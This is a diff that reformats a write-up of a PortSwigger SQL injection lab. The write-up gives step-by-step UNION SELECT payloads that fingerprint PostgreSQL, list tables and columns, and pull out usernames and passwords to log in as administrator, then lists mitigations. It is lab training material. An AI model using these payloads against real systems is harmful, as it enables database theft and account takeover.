@@ -8,53 +8,52 @@ This lab contains a SQL injection vulnerability in the product category filter. 
 **Lab Link** >> https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
 
 *Navigate to*
-/filter?category=Gifts
+* /filter?category=Gifts
 
 *Confirm injection point*
-category=Gifts'
+* category=Gifts'
     → Internal server error confirms SQL injection
 
 *Bypass query*
-category=Gifts'--
+* category=Gifts'--
     → Query executes successfully
 
 *Determine number of columns*
-category=Gifts' ORDER BY 2--
+* category=Gifts' ORDER BY 2--
     → Success
 
-category=Gifts' ORDER BY 3--
+* category=Gifts' ORDER BY 3--
     → Error → Confirms 2 columns
 
 *Confirm database type*
-category=Gifts' UNION SELECT NULL, version()--
+* category=Gifts' UNION SELECT NULL, version()--
     → Displays PostgreSQL version
 
 *Extract table names*
-category=Gifts' UNION SELECT NULL, table_name FROM information_schema.tables--
+* category=Gifts' UNION SELECT NULL, table_name FROM information_schema.tables--
 
 *Extract column names*
-category=Gifts' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users_rlzmfh'--
+* category=Gifts' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users_rlzmfh'--
 
 *Extract credentials*
-category=Gifts' UNION SELECT username_xglsoj, password_toiblr FROM users_rlzmfh--
+* category=Gifts' UNION SELECT username_xglsoj, password_toiblr FROM users_rlzmfh--
 
 *Use credentials*
-Username: administrator
-Password: extracted value
-
-→ Login successful
+* Username: administrator
+* Password: extracted value
+    → Login successful
 
 # Payload Used
-' UNION SELECT username_xglsoj, password_toiblr FROM users_rlzmfh--
+* ' UNION SELECT username_xglsoj, password_toiblr FROM users_rlzmfh--
 
 # Impact
-An attacker can extract sensitive data such as usernames and passwords, leading to full account takeover, including administrative access.
+* An attacker can extract sensitive data such as usernames and passwords, leading to full account takeover, including administrative access.
 
 # Tools Used
-Browser
-Burp Suite (Proxy, Repeater)
+* Browser
+* Burp Suite (Proxy, Repeater)
 
 # Mitigation
-Use parameterized queries
-Implement input validation
-Restrict database error output
+* Use parameterized queries
+* Implement input validation
+* Restrict database error output
